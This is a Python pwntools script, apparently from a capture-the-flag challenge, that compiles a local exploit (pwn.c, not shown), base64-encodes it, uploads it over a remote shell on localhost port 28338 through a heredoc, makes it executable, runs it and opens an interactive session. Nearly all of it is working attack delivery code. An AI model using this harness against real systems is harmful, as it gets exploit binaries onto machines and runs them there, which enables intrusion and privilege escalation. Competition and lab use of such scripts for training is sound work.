#!/usr/bin/env python3
from pwn import *

linfo = lambda x: log.info(x)
lwarn = lambda x: log.warn(x)
lerror = lambda x: log.error(x)
lprog = lambda x: log.progress(x)

byt = lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
phex = lambda x, y='': print(y + hex(x))
lhex = lambda x, y='': linfo(y + hex(x))
pad = lambda x, s=8, v=b'\0', o='r': byt(x).ljust(s, byt(v)) if o == 'r' else byt(x).rjust(s, byt(v))
padhex = lambda x, s=None: pad(hex(x)[2:],((x.bit_length()//8)+1)*2 if s is None else s, b'0', 'l')
upad = lambda x: u64(pad(x))
tob = lambda x: bytes.fromhex(padhex(x).decode())

gelf = lambda elf=None: elf if elf else exe
srh = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh = lambda x: srh(x, libc)
lasm = lambda x: sasm(x, libc)

cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

t = None
gt = lambda at=None: at if at else t
sl = lambda x, t=None: gt(t).sendline(byt(x))
se = lambda x, t=None: gt(t).send(byt(x))
sla = lambda x, y, t=None: gt(t).sendlineafter(byt(x), byt(y))
sa = lambda x, y, t=None: gt(t).sendafter(byt(x), byt(y))
ra = lambda t=None: gt(t).recvall()
rl = lambda t=None: gt(t).recvline()
rls = lambda t=None: rl(t)[:-1]
re = lambda x, t=None: gt(t).recv(x)
ru = lambda x, t=None: gt(t).recvuntil(byt(x))
it = lambda t=None: gt(t).interactive()
cl = lambda t=None: gt(t).close()


IP = 'localhost'
PORT = 28338
BINARY='/tmp/pwn'

def send_cmd(cmd, prefix='~ $'):
  ru(prefix)
  sl(cmd)
  ru(cmd)

def checkpoint():
  key=randoms(0x10)
  send_cmd(f'echo {key}'.encode())
  ru(key.encode())

context.newline = b'\r\n'

linfo('compile pwn binary')
os.system(f'gcc -static -Os ./pwn.c -o {BINARY}')
os.system(f'xz {BINARY}')

linfo('read pwn file')
pwn = b''
with open(f'{BINARY}.xz', 'rb') as pwn_file:
  pwn = b64e(pwn_file.read())

os.remove(f'{BINARY}.xz')

t = remote(IP, PORT)

linfo('wait for init')
ru(b'#    Tired of bloated heap implementations?        #')
checkpoint()

linfo('deploy pwn binary')
send_cmd(b'base64 -d << EOF | unxz > /tmp/pwn')

p = log.progress('sending file')
STEPS=64
for i in range(0, len(pwn), STEPS):
  p.status(f'sending file {i//STEPS}/{len(pwn)//STEPS}')
  line = pwn[i:min(i+STEPS, len(pwn))]
  send_cmd(line.encode(), '> ')

sl(b'EOF')
p.success('send file')

sl(b'chmod +x /tmp/pwn')

checkpoint()

linfo('execute pwn binary')
sl(b'/tmp/pwn')
rl()

t.interactive()
